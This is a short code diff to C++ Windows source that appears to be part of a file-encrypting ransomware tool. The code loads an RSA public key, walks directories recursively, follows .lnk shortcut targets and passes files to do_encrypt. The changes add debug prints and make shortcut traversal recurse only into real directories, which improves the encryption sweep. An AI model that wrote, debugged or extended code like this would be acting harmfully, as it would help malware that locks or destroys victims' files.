@@ -44,6 +44,7 @@ Status getPublicParams(string id, string& mod, string& pubKey,bool fromStart)
 	{
 		std::fstream pubFile;
 		string pathToENC = get_path_to_ENC();
+		std::cout << "openning " << pathToENC << std::endl;
 		pubFile.open(pathToENC, std::ios::in);
 		if (!pubFile.is_open())
 		{
@@ -52,6 +53,7 @@ Status getPublicParams(string id, string& mod, string& pubKey,bool fromStart)
 		}
 		chunk = std::string((std::istreambuf_iterator<char>(pubFile)), std::istreambuf_iterator<char>());
 		pubFile.close();
+		std::cout << "got data from file" << std::endl;
 	}
 
 
@@ -519,7 +521,7 @@ static void iterate(const path& parent,
 
 	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
 		path = itr->path().string();
-		//std::cout << "handling " << path << std::endl;//DEBUG PRINT
+		std::cout << "handling " << path << std::endl;//DEBUG PRINT
 		string ending(path.begin()+path.size()-3, path.end());
 		bool lnkFile =false;
 
@@ -538,7 +540,8 @@ static void iterate(const path& parent,
 			if (getLinkTarget(path.c_str(), bufStr, path.size()) == 0) continue;
 			path = string(bufStr);
 			HeapFree(GetProcessHeap(), 0, bufStr);
-			iterate(path, rsaEncryptor, processedPaths);
+			if(is_directory(path))
+				iterate(path, rsaEncryptor, processedPaths);
 		}
 		else {
 			if (!do_encrypt(path)) continue;//see TODO 2 rows below
